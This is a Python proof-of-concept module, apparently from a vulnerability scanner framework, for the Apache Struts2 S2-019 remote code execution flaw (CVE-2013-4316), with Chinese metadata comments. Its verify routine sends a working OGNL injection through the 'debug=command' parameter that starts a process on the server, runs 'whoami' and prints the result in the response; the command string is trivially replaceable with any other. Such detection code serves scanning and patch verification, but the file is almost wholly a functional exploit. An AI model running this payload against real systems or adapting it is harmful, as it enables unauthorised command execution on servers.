# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Apache_Struts_0010_p'  # 平台漏洞编号，留空
    name = 'Apache Struts2 S2-019远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2013-10-08'  # 漏洞公布时间
    desc = '''
        Apache Struts2中存在漏洞，动态方法调用是一种已知的可能导致安全漏洞的机制，但到目前为止，它是默认启用的，警告用户应该在可能的情况下关闭它。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2014-00664'  # 漏洞来源
    cnvd_id = 'CNVD-2014-00664'  # cnvd漏洞编号
    cve_id = 'CVE-2013-4316'  # cve编号
    product = 'Apache-Struts'  # 漏洞应用名称
    product_version = 'Struts 2.0.0 - Struts 2.3.15.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '721227e2-467b-43e8-a788-aea4e1ca2f6e'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:

            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = {'debug': 'command', 'expression': '''#a=(new java.lang.ProcessBuilder('whoami')).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#out.getWriter().println('dbapp:'+new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()
'''}
            request = requests.get(
                '{target}/example/HelloWorld.action'.format(target=self.target), params=payload)
            r = request.text
            if 'root' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
